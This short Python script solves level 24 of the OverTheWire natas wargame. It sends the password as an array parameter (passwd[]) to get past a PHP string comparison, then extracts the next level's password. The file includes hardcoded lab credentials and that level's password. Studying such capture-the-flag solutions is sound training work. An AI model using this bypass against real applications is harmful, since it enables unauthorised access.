import requests
import re

url = 'http://natas24.natas.labs.overthewire.org/?passwd[]=11iloveyou'
auth = requests.auth.HTTPBasicAuth('natas24','OsRmXFguozKpTZZ5X14zNO43379LZveg')
r = requests.post(url, auth=auth)

pwd = re.findall('natas25 Password: (.*)</pre>', r.text)[0]
print(pwd) # GHF6X7YwACaYYssHVY05cFq83hRktl4c

